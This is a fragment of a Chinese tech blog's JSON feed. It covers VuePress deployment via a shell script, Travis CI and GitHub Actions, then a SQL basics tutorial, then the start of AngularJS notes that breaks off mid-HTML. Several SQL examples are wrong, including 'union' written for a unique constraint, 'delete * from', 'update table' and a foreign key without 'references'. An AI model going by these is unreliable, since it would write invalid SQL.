部署</a></p>\n</div>\n<h3 id=\"自动向-github-提交代码脚本\" tabindex=\"-1\"> 自动向 GitHub 提交代码脚本</h3>\n<p>在你的项目目录中创建 <code>deploy.sh</code> , 自行修改下方中的注释行代码</p>\n<div><p>注意</p>\n<p>这边的分支不能提交到 master 分支上, 因为 GitHub Pages 服务中指定了 master 分支为静态页面发布分支, 所以需要在本地创建一个名为 gh-pages 的分支, 我们的博客源码全部托管在这个分支上（当然你也可以叫其他名字）</p>\n</div>\n<div><pre><code><span>#!/usr/bin/env sh</span>\n\n<span># 确保脚本抛出遇到的错误</span>\n\n<span>set</span> -e\n\n<span>date</span><span>=</span> <span><span>`</span><span>date</span> +<span>\"%Y-%m-%d %H:%M:%S\"</span><span>`</span></span>\n<span>commitmsg</span><span>=</span><span>'Site updated: '</span><span>$date</span>\n<span>git</span> <span>add</span> -A\n<span>git</span> commit -m <span>\"<span>$commitmsg</span>\"</span>\n\n<span># 如果发布到 https://&lt;USERNAME>.github.io</span>\n\n<span># 将 &lt;USERNAME> 替换成你的 GitHub 名字</span>\n\n<span># git push -f git@github.com:&lt;USERNAME>/&lt;USERNAME>.github.io.git gh-pages:gh-pages</span>\n\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"自动化脚本\" tabindex=\"-1\"> 自动化脚本</h3>\n<p>在你的项目目录中创建 <code>.travis.yml</code> , 更多的配置项戳这里 <a href=\"https://docs.travis-ci.com/user/deployment\" target=\"_blank\" rel=\"noopener noreferrer\">Travis CI Deployment</a></p>\n<div><pre><code><span>language</span><span>:</span> node_js\n<span>node_js</span><span>:</span> + lts/*\n\n<span>install</span><span>:</span> + npm ci\n\n<span>script</span><span>:</span> + npm run build\n\n<span>deploy</span><span>:</span>\n  <span>provider</span><span>:</span> pages\n  <span>skip-cleanup</span><span>:</span> <span>true</span>\n  <span>local_dir</span><span>:</span> public\n  <span>github-token</span><span>:</span> $GITHUB_TOKEN <span># a token generated on github allowing travis to push code on you repository</span>\n  <span>target-branch</span><span>:</span> master\n  <span>verbose</span><span>:</span> <span>true</span>\n  <span>keep-history</span><span>:</span> <span>true</span>\n  <span>on</span><span>:</span>\n    <span>branch</span><span>:</span> gh<span>-</span>pages\n<span>branches</span><span>:</span>\n  <span>only</span><span>:</span>\n    <span>-</span> gh<span>-</span>pages\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"自动化部署\" tabindex=\"-1\"> 自动化部署</h3>\n<h4 id=\"github-actions\" tabindex=\"-1\"> GitHub Actions</h4>\n<p>在项目中创建 <code>.github</code> 文件夹, GitHub Actions 将会自动执行该目录下的所有 .yml 文件</p>\n<div><pre><code><span>name</span><span>:</span> VUEPRESS DEPLOY\n\n<span>on</span><span>:</span> <span># 触发条件</span>\n  <span># 每当 push 到 master 分支时触发部署</span>\n  <span>push</span><span>:</span>\n    <span>branches</span><span>:</span> <span>[</span>master<span>]</span>\n  <span># 手动触发部署</span>\n  <span>workflow_dispatch</span><span>:</span>\n\n<span>jobs</span><span>:</span>\n  <span>docs</span><span>:</span>\n    <span>runs-on</span><span>:</span> ubuntu<span>-</span>latest\n\n    <span>steps</span><span>:</span>\n      <span>-</span> <span>uses</span><span>:</span> actions/checkout@v2\n        <span>with</span><span>:</span>\n          <span># “最近更新时间” 等 git 日志相关信息, 需要拉取全部提交记录</span>\n          <span>fetch-depth</span><span>:</span> <span>0</span>\n\n      <span>-</span> <span>name</span><span>:</span> Setup Node.js\n        <span>uses</span><span>:</span> actions/setup<span>-</span>node@v1\n        <span>with</span><span>:</span>\n          <span># 选择要使用的 node 版本</span>\n          <span>node-version</span><span>:</span> <span>\"14\"</span>\n\n      <span># 缓存 node_modules</span>\n      <span>-</span> <span>name</span><span>:</span> Cache dependencies\n        <span>uses</span><span>:</span> actions/cache@v2\n        <span>id</span><span>:</span> yarn<span>-</span>cache\n        <span>with</span><span>:</span>\n          <span>path</span><span>:</span> <span>|</span><span>\n            **/node_modules</span>\n          <span>key</span><span>:</span> $<span>{</span><span>{</span> runner.os <span>}</span><span>}</span><span>-</span>yarn<span>-</span>$<span>{</span><span>{</span> hashFiles('<span>**/yarn.lock')</span> <span>}</span><span>}</span>\n          <span>restore-keys</span><span>:</span> <span>|</span><span>\n            ${{ runner.os }}-yarn-</span>\n\n      <span># 如果缓存没有命中, 安装依赖</span>\n      <span>-</span> <span>name</span><span>:</span> Install dependencies\n        <span>if</span><span>:</span> steps.yarn<span>-</span>cache.outputs.cache<span>-</span>hit <span>!=</span> 'true'\n        <span>run</span><span>:</span> yarn <span>-</span><span>-</span>frozen<span>-</span>lockfile\n\n      <span># 运行构建脚本</span>\n      <span>-</span> <span>name</span><span>:</span> Build VuePress site\n        <span>run</span><span>:</span> yarn build\n\n      <span># 查看 workflow 的文档来获取更多信息</span>\n      <span># @see https://github.com/crazy-max/ghaction-github-pages</span>\n      <span>-</span> <span>name</span><span>:</span> Deploy to GitHub Pages\n        <span>uses</span><span>:</span> crazy<span>-</span>max/ghaction<span>-</span>github<span>-</span>pages@v2\n        <span>with</span><span>:</span>\n          <span># 部署到 gh-pages 分支</span>\n          <span>target_branch</span><span>:</span> gh<span>-</span>pages\n          <span># 部署目录为 VuePress 的默认输出目录</span>\n          <span>build_dir</span><span>:</span> publish<span>-</span>pages\n        <span>env</span><span>:</span>\n          <span>GITHUB_TOKEN</span><span>:</span> $<span>{</span><span>{</span> secrets.GITHUB_TOKEN <span>}</span><span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"travis-ci\" tabindex=\"-1\"> Travis CI</h4>\n<div><p>非常重要</p>\n<p>需要想你的仓库中正确提交你的 package-lock.json, 否则 Travis CI 在执行 <code>npm ci</code> 时可能会发生错误<br> 当然如果你并不想这么做的的话, 可以将 <code>npm ci</code> 替换成 <code>npm install</code></p>\n</div>\n<p>首先进入 <a href=\"https://travis-ci.org/\" target=\"_blank\" rel=\"noopener noreferrer\">travis-ci 官网</a>, 将对应的项目启用 Travis CI</p>\n<p><img src=\"/assets/vuepress-blog-1.png\" alt=\"vuepress-blog\"></p>\n<p>点进去之后可以进行更多的配置</p>\n<p><img src=\"/assets/vuepress-blog-2.png\" alt=\"vuepress-blog\"></p>\n<p>生成你的 GitHub Token, 首先获取这个 token, 进入 Github 设置, 左下的 Developer settings</p>\n<p><img src=\"/assets/vuepress-blog-3.png\" alt=\"vuepress-blog\"></p>\n<p>添加描述, 这里只需勾选 <code>repo</code> , 如果需要其他的配置自行勾选</p>\n<p><img src=\"/assets/vuepress-blog-4.png\" alt=\"vuepress-blog\"></p>\n<p>保存之后将会生成的 token, 将生成的 token 放入 Travis 配置中</p>\n<div><p>注意</p>\n<p>这边配置的变量名需要和 <code>.travis.yml</code> 中指定的名字一样, 这边使用的变量名为 GITHUB_TOKEN</p>\n</div>\n<p><img src=\"/assets/vuepress-blog-5.png\" alt=\"vuepress-blog\"></p>\n<p>至此, 你可以进行发布代码操作了, 执行下面的命令即可将代码提交到你的 GitHub 上了</p>\n<div><pre><code><span>npm</span> run deploy\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>代码提交之后 Travis 也开始对你提交的代码进行编译操作了, 编译成功之后将会自动的把 <code>public</code> 目录提交到你的 master 分支了</p>\n<div><p>注意</p>\n<p>状态颜色一定要是绿色才代表编译并且部署成功了</p>\n</div>\n<p><img src=\"/assets/vuepress-blog-6.png\" alt=\"vuepress-blog\"></p>\n<h3 id=\"拓展阅读\" tabindex=\"-1\"> 拓展阅读</h3>\n<p>NPM 5.7.0 引入了一种新的安装依赖的方式：</p>\n<div><pre><code><span>npm</span> ci\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>它是从 <code>package-lock.json</code> 文件安装依赖, 具有快以及可靠优点, 关于速度的比较引用官方图</p>\n<p><img src=\"/assets/vuepress-blog-7.png\" alt=\"vuepress-blog\"></p>\n<p>官方有下面补充：</p>\n<ul>\n<li>项目里面必须存在 <code>package-lock.json</code> 或 <code>npm-shrinkwrap.json</code> .</li>\n<li>如果 <code>package lock</code> 里面依赖和 <code>package.json</code> 不一致, <code>npm ci</code> 会报错并且退出, 而不是更新 <code>package lock</code> 文件</li>\n<li><code>npm ci</code> 只能一次性安装整个工程的依赖, 不能使用这个命令单独添加依赖</li>\n<li>如果 <code>node_modules</code> 文件夹存在, 它会在安装依赖之前删除这个文件夹</li>\n<li>它不会改变 <code>package.json</code> 或者任何 <code>package-locks</code></li>\n</ul>\n<div><p>注意</p>\n<p>如果想要使 vuepress 支持编译 node_modules 目录下的 jsx 代码时（前端框架 vue）, 可进行下列操作</p>\n</div>\n<p>先安装 jsx 的转换依赖 <a href=\"https://www.npmjs.com/package/@vue/babel-preset-jsx\" target=\"_blank\" rel=\"noopener noreferrer\">@vue/babel-preset-jsx</a></p>\n<div><pre><code><span># for yarn:</span>\n<span>yarn</span> <span>add</span> -D @vue/babel-preset-jsx @vue/babel-helper-vue-jsx-merge-props\n<span># for npm:</span>\n<span>npm</span> <span>install</span> -D @vue/babel-preset-jsx @vue/babel-helper-vue-jsx-merge-props\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>安装 babel 的环境包</p>\n<div><pre><code><span># for yarn:</span>\n<span>yarn</span> <span>add</span> -D @babel/preset-env\n<span># for npm:</span>\n<span>npm</span> <span>install</span> -D @babel/preset-env\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>在 <code>.vuepress/config.js</code> 中添加以下代码</p>\n<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>\n  <span>configureWebpack</span><span>:</span> <span>{</span>\n    <span>// 用于解析 node_modules 目录下的 jsx 代码</span>\n    <span>module</span><span>:</span> <span>{</span>\n      <span>rules</span><span>:</span> <span>[</span>\n        <span>{</span>\n          <span>test</span><span>:</span> <span><span>/</span><span>\\.m?js$</span><span>/</span></span><span>,</span>\n          <span>include</span><span>:</span> <span><span>/</span><span>node_modules</span><span>/</span></span><span>,</span>\n          <span>use</span><span>:</span> <span>{</span>\n            <span>loader</span><span>:</span> <span>\"babel-loader\"</span><span>,</span>\n            <span>options</span><span>:</span> <span>{</span>\n              <span>presets</span><span>:</span> <span>[</span>\n                <span>[</span><span>\"@babel/preset-env\"</span><span>,</span> <span>{</span> <span>targets</span><span>:</span> <span>\"defaults\"</span> <span>}</span><span>]</span><span>,</span>\n                <span>[</span>\n                  <span>\"@vue/babel-preset-jsx\"</span><span>,</span>\n                  <span>{</span>\n                    <span>vModel</span><span>:</span> <span>true</span><span>,</span> <span>// vModel syntactic sugar</span>\n                    <span>functional</span><span>:</span> <span>true</span><span>,</span> <span>// @vue/babel-sugar-functional-vue - Functional components syntactic sugar</span>\n                    <span>injectH</span><span>:</span> <span>true</span><span>,</span> <span>// Automatic h injection syntactic sugar</span>\n                    <span>vOn</span><span>:</span> <span>true</span><span>,</span> <span>// vOn syntactic sugar</span>\n                    <span>compositionAPI</span><span>:</span> <span>false</span><span>,</span> <span>// Enables @vue/babel-sugar-composition-api-inject-h and @vue/babel-sugar-composition-api-render-instance, support returning render function in setup</span>\n                  <span>}</span><span>,</span>\n                <span>]</span><span>,</span>\n              <span>]</span><span>,</span>\n            <span>}</span><span>,</span>\n          <span>}</span><span>,</span>\n        <span>}</span><span>,</span>\n      <span>]</span><span>,</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>",
      "image": "https://vxhly.github.io/assets/nodejs-cli-1.png",
      "date_published": "2019-10-28T16:14:34.000Z",
      "date_modified": "2022-08-01T13:55:22.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "nodejs"
      ]
    },
    {
      "title": "SQL 语法基础",
      "url": "https://vxhly.github.io/views/other/sql-grammar.html",
      "id": "https://vxhly.github.io/views/other/sql-grammar.html",
      "summary": "前言\n整理了下 SQL 语法基础, 适用于 SQL server 和 MySQL, 本博文皆为实例 SQL 语句仅供参考。\n\n",
      "content_html": "<div><p>前言</p>\n<p>整理了下 SQL 语法基础, 适用于 SQL server 和 MySQL, 本博文皆为实例 SQL 语句仅供参考。</p>\n</div>\n\n<h2 id=\"概念\" tabindex=\"-1\"> 概念</h2>\n<h3 id=\"基本概念\" tabindex=\"-1\"> 基本概念</h3>\n<ul>\n<li>数据库中的行称作 <code>元组</code> 、 <code>记录</code></li>\n<li>数据库中的列称作 <code>属性</code> 、 <code>字段</code></li>\n<li>常见数据库模型 <code>层次模型</code> <code>网状模型</code> <code>关系模型</code> <code>对象关系模型</code> <code>对象模型</code></li>\n</ul>\n<h3 id=\"表约束\" tabindex=\"-1\"> 表约束</h3>\n<ul>\n<li>主键约束（Primay Key Coustraint） 唯一性, 非空性</li>\n<li>唯一约束 （Unique Counstraint）唯一性, 可以空, 但只能有一个</li>\n<li>检查约束 (Check Counstraint) 对该列数据的范围、格式的限制（如: 年龄、性别等）</li>\n<li>默认约束 (Default Counstraint) 该数据的默认值</li>\n<li>外键约束 (Foreign Key Counstraint) 需要建立两表间的关系并引用主表的列</li>\n</ul>\n<h3 id=\"curd\" tabindex=\"-1\"> CURD</h3>\n<ul>\n<li>创建（Create）</li>\n<li>更新（Update）</li>\n<li>读取（Retrieve）</li>\n<li>删除（Delete）</li>\n</ul>\n<h2 id=\"数据库\" tabindex=\"-1\"> 数据库</h2>\n<h3 id=\"创建\" tabindex=\"-1\"> 创建</h3>\n<div><pre><code><span>create</span> <span>database</span> dbxx\n<span>on</span> <span>(</span>\n  name<span>=</span>dd1<span>,</span>filename<span>=</span><span>\"c:\\dd\\dd1.mdf\"</span><span>,</span>\n  maxsize<span>=</span>unlimited<span>,</span>filegrowth<span>=</span><span>10</span><span>%</span>\n<span>)</span><span>,</span>\nfilegroup xx <span>(</span>\n  name<span>=</span>dd2<span>,</span>filename<span>=</span><span>\"c:\\dd\\dd2,mdf\"</span><span>,</span>\n  maxsize<span>=</span>unlimited\n<span>)</span><span>,</span>\n<span>(</span>\n  name<span>=</span>dd3<span>,</span>filename<span>=</span><span>\"d:\\dd\\dd3.ndf\"</span><span>,</span>\n  size<span>=</span><span>50</span>MB<span>,</span>maxsize<span>=</span>unlimited<span>,</span>filegrowth<span>=</span><span>10</span>MB\n<span>)</span>\nlog <span>on</span> <span>(</span>\n  name<span>=</span>LLg<span>,</span>filename<span>=</span><span>\"d:\\dd\\ll.;df\"</span><span>,</span>\n  size<span>=</span><span>10</span>MB<span>,</span>maxsize<span>=</span><span>50</span>MB<span>,</span>filegrowth<span>=</span><span>20</span>MB\n<span>)</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"删除\" tabindex=\"-1\"> 删除</h3>\n<div><pre><code><span>use</span> master\n<span>drop</span> <span>database</span> dbxx\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"创表\" tabindex=\"-1\"> 创表</h2>\n<div><pre><code><span>create</span> <span>table</span> Student\n<span>(</span>\n  stuNo <span>int</span><span>,</span>\n  stuName <span>varchar</span><span>(</span><span>10</span><span>)</span><span>,</span>\n  sex <span>char</span><span>(</span><span>2</span><span>)</span><span>,</span>\n  dep <span>varchar</span><span>(</span><span>20</span><span>)</span><span>,</span>\n  ID <span>char</span><span>(</span><span>18</span><span>)</span><span>,</span>\n  weight <span>decimal</span><span>(</span><span>4</span><span>,</span> <span>1</span><span>)</span>\n<span>)</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"约束\" tabindex=\"-1\"> 约束</h2>\n<h3 id=\"主键约束\" tabindex=\"-1\"> 主键约束</h3>\n<div><pre><code><span>-- 添加约束</span>\n<span>alter</span> <span>table</span> Student\n<span>add</span> <span>constraint</span> PK_S1 <span>primary</span> <span>key</span><span>(</span>stuNo<span>)</span>\n\n<span>-- 删除约束</span>\n<span>alter</span> <span>table</span> Student\n<span>drop</span> <span>constraint</span> PK_S1\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"唯一约束\" tabindex=\"-1\"> 唯一约束</h3>\n<div><pre><code><span>-- 添加约束</span>\n<span>alter</span> <span>table</span> Student\n<span>add</span> <span>constraint</span> UN_S2 <span>union</span><span>(</span>ID<span>)</span>\n\n<span>-- 删除约束</span>\n<span>alter</span> <span>table</span> Student\n<span>drop</span> <span>constraint</span> UN_S2\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"默认约束\" tabindex=\"-1\"> 默认约束</h3>\n<div><pre><code><span>-- 添加约束</span>\n<span>alter</span> <span>table</span> Student\n<span>add</span> <span>constraint</span> DF_S3 <span>default</span><span>(</span><span>'男'</span><span>)</span> <span>for</span> sex\n\n<span>-- 删除约束</span>\n<span>alter</span> <span>table</span> Student\n<span>drop</span> <span>constraint</span> DF_S3\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"检查约束\" tabindex=\"-1\"> 检查约束</h3>\n<div><pre><code><span>-- 创建约束</span>\n<span>alter</span> <span>table</span> Student\n<span>add</span> <span>constraint</span> CK_S4 <span>check</span><span>(</span>sex<span>=</span><span>'男'</span> <span>or</span> sex<span>=</span><span>'女'</span><span>)</span>\n\n<span>-- 删除约束</span>\n<span>alter</span> <span>table</span> Student\n<span>drop</span> <span>constraint</span> CK_S4\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"外键约束\" tabindex=\"-1\"> 外键约束</h3>\n<div><pre><code><span>-- 创建约束</span>\n<span>alter</span> <span>table</span> Student\n<span>add</span> <span>constraint</span> FK_S5 <span>foreign</span> <span>key</span><span>(</span>stuNo<span>)</span> stuInfo<span>(</span>stuID<span>)</span>\n\n<span>-- 删除约束</span>\n<span>alter</span> <span>table</span> Student\n<span>drop</span> <span>constraint</span> FK_S5\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"删除-1\" tabindex=\"-1\"> 删除</h2>\n<div><pre><code><span>-- 删表之前一定要先把外键约束先删掉</span>\n<span>drop</span> <span>table</span> Student\n\n<span>-- 删除表中的某一列</span>\n<span>alter</span> <span>table</span> Student\n<span>drop</span> <span>column</span> dep\n\n<span>-- 删除指定数据</span>\n<span>delete</span> <span>from</span> Student\n<span>where</span> dep<span>=</span><span>\"信息系\"</span>\n\n<span>-- 逐行删除</span>\n<span>delete</span> <span>*</span> <span>from</span> Student\n\n<span>-- 按条件删除</span>\n<span>delete</span> <span>*</span> <span>from</span> Student\n<span>where</span> sex<span>=</span><span>'男'</span>\n\n<span>-- 快速删除表数据</span>\n<span>truncate</span> <span>table</span> Student\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"更新\" tabindex=\"-1\"> 更新</h2>\n<div><pre><code><span>-- 新增数据</span>\n<span>insert</span> <span>into</span> Student\n<span>values</span> <span>(</span><span>123096832</span><span>,</span><span>'张三'</span><span>,</span><span>'男'</span><span>,</span><span>'外语系'</span><span>,</span><span>350181123401021298</span><span>)</span>\n\n<span>-- 更新数据</span>\n<span>update</span> <span>table</span> Student\n<span>set</span> stuName<span>=</span><span>'张三'</span> <span>where</span> stuNo<span>=</span><span>'1013141516'</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"查询\" tabindex=\"-1\"> 查询</h2>\n<div><pre><code><span>select</span> <span>*</span> <span>from</span> Student\n\n<span>select</span> <span>all</span> sex <span>from</span> Student\n<span>select</span> <span>distinct</span> sex <span>from</span>  Student <span>-- 过滤重复</span>\n\n<span>select</span> <span>top</span> <span>3</span> <span>percent</span> <span>*</span> <span>from</span> Student <span>-- 前 3% 条</span>\n<span>select</span> <span>top</span> <span>3</span> <span>*</span> <span>from</span> Student <span>-- 前 3 条</span>\n\n<span>-- 根据某一列查询</span>\n<span>select</span> <span>top</span> <span>3</span> <span>with</span> ties weight\n<span>from</span> Student\n<span>order</span> <span>by</span> weight <span>asc</span>\n\n<span>-- 排序。默认升序</span>\n<span>select</span> <span>*</span> <span>from</span> Student <span>order</span> <span>by</span> name\n<span>select</span> <span>*</span> <span>from</span> Student <span>order</span> <span>by</span> name <span>desc</span> <span>-- 降序</span>\n<span>select</span> <span>*</span> <span>from</span> Student <span>order</span> <span>by</span> name <span>asc</span> <span>-- 升序</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"统计\" tabindex=\"-1\"> 统计</h2>\n<p>假设 Student 表中共有 20 行记录, 其中有效性别行数为 18</p>\n<div><pre><code><span>select</span> <span>count</span><span>(</span><span>*</span><span>)</span> <span>from</span> Student <span>-- 返回值 20,返回行为 1</span>\n<span>select</span> <span>count</span><span>(</span>sex<span>)</span> <span>from</span> Student <span>-- 返回值 18,不会统计 NULL,返回行为 1</span>\n<span>select</span> <span>count</span><span>(</span><span>distinct</span> sec<span>)</span> <span>from</span> Student <span>-- 返回值 2,计算不重复的,返回行为 1</span>\n\n<span>select</span> <span>count</span><span>(</span>weight<span>)</span><span>,</span> weight\n<span>from</span> Student <span>group</span> <span>by</span> weight\n<span>having</span> weight <span>is</span> <span>not</span> <span>null</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>",
      "date_published": "2018-01-23T17:04:08.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "other"
      ]
    },
    {
      "title": "Angularjs 学习笔记",
      "url": "https://vxhly.github.io/views/other/study-angularjs-notes.html",
      "id": "https://vxhly.github.io/views/other/study-angularjs-notes.html",
      "summary": "前言\nAngularjs 1.0 的学习笔记。\n\n",
      "content_html": "<div><p>前言</p>\n<p>Angularjs 1.0 的学习笔记。</p>\n</div>\n\n<h2 id=\"依赖注入\" tabindex=\"-1\"> 依赖注入</h2>\n<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>></span></span>\n<span><span><span>&lt;</span>html</span> <span>ng-app</span><span><span>=</span><span>\"</span>MyModule<span>\"</span></span><span>></span></span>\n  <span><span><span>&lt;</span>head</span><span>></span></span>\n    <span><span><span>&lt;</span>title</span><span>></span></span>最基本的依赖注入方式<span><span><span>&lt;/</span>title</span><span>></span></span>\n    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>\"</span>utf-8<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>\"</span>../Script/angular.min.js<span>\"</span></span> <span>type</span><span><span>=</span><span>\"</span>text/javascript<span>\"</span></span><span>></span></span><span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n    <span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>\"</span>base.js<span>\"</span></span><span>></span></span><span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>\"</span>stylesheet<span>\"</span></span> <span>href</span><span><span>=</span><span>\"</span>../bootstrap-3.0.0/css/bootstrap.css<span>\"</span></span> <span>/></span></span>\n  <span><span><span>&lt;/</span>head</span><span>></span></span>\n\n  <span><span><span>&lt;</span>body</span><span>></span></span>\n    <span><span><span>&lt;</span>div</span><span>></span></span>\n      <span><span><span>&lt;</span>div</span> <span>ng-controller</span><span><span>=</span><span>\"</span>MyCtrl<span>\"</span></span> <span><span>style</span><span><span>=</span><span>\"</span><span><span>text-align</span><span>:</span> c</span><span>\"</span></span></span><span>></span></span>\n        <span><span><span>&lt;</span>span</span> <span><span>style</span><span><span>=</span><span>\"</span><span><span>font-size</span><span>:</span> 20px<span>;</span></span><span>\"</span></span></span><span>></span></span>{{gameName}}<span><span><span>&lt;/</span>span</span><span>></span></span>\n      <span><span><span>&lt;/</span>div</span><span>></span></span>\n    <span><span><span>&lt;/</span>div</span><span>></span></span>\n  <span><span><span>&lt;/</span>body</span><span>></span></span>\n<span><span><span>&lt;/</span>html</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"内联式注入\" tabindex=\"-1\"> 内联式注入</h3>\n<div><pre><code><span>//最基本的依赖注入方式</span>\n<span>var</span> MyModule <span>=</span> angular<span>.</span><span>module</span><span>(</span><span>\"MyModule\"</span><span>,</span> <span>[</span><span>]</span><span>)</span><span>;</span>\nMyModule<span>.</span><span>controller</span><span>(</span><span>\"MyCtrl\"</span><span>,</span> <span>[</span>\n  <span>\"$scope\"</span><span>,</span>\n  <span>function</span> <span>(</span><span>$scope</span><span>)</span> <span>{</span>\n    <span>//可以修改参数,如$scope1,但下面必须同时改</span>\n    $scope<span>.</span>gameName <span>=</span> <span>\"hello\"</span><span>;</span>\n  <span>}</span><span>,</span>\n<span>]</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"推断型注入\" tabindex=\"-1\"> 推断型注入</h3>\n<div><pre><code><span>//推断型注入方式:函数参数的名称必须要和被注入的对象相同</span>\n<span>var</span> MyModule <span>=</span> angular<span>.</span><span>module</span><span>(</span><span>\"MyModule\"</span><span>,</span> <span>[</span><span>]</span><span>)</span><span>;</span>\n\n<span>var</span> <span>MyCtrl</span> <span>=</span> <span>function</span> <span>(</span><span>$scope</span><span>)</span> <span>{</span>\n  $scope<span>.</span>gameName <span>=</span> <span>\"hello\"</span><span>;</span>\n<span>}</span><span>;</span>\n\nMyModule<span>.</span><span>controller</span><span>(</span><span>\"MyCtrl\"</span><span>,</span> MyCtrl<span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"声明式注入\" tabindex=\"-1\"> 声明式注入</h3>\n<div><pre><code><span>//声明式注入</span>\n<span>var</span> MyModule <span>=</span> angular<span>.</span><span>module</span><span>(</span><span>\"MyModule\"</span><span>,</span> <span>[</span><span>]</span><span>)</span><span>;</span>\n\n<span>var</span> <span>MyCtrl</span> <span>=</span> <span>function</span> <span>(</span><span>thisISMyName</span><span>)</span> <span>{</span>\n  <span>//参数名称可以随意变化</span>\n  thisISMyName<span>.</span>gameName <span>=</span> <span>\"hello\"</span><span>;</span>\n<span>}</span><span>;</span>\n\nMyCtrl<span>.</span>$inject <span>=</span> <span>[</span><span>\"$scope\"</span><span>]</span><span>;</span> <span>//加载模块</span>\n\nMyModule<span>.</span><span>controller</span><span>(</span><span>\"MyCtrl\"</span><span>,</span> MyCtrl<span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"双向绑定\" tabindex=\"-1\"> 双向绑定</h2>\n<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>></span></span>\n<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>\"</span>en<span>\"</span></span><span>></span></span>\n  <span><span><span>&lt;</span>head</span><span>></span></span>\n    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>\"</span>UTF-8<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>\"</span>viewport<span>\"</span></span> <span>content</span><span><span>=</span><span>\"</span>width=device-width, initial-scale=1.0<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>\"</span>X-UA-Compatible<span>\"</span></span> <span>content</span><span><span>=</span><span>\"</span>ie=edge<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>\n  <span><span><span>&lt;/</span>head</span><span>></span></span>\n\n  <span><span><span>&lt;</span>body</span> 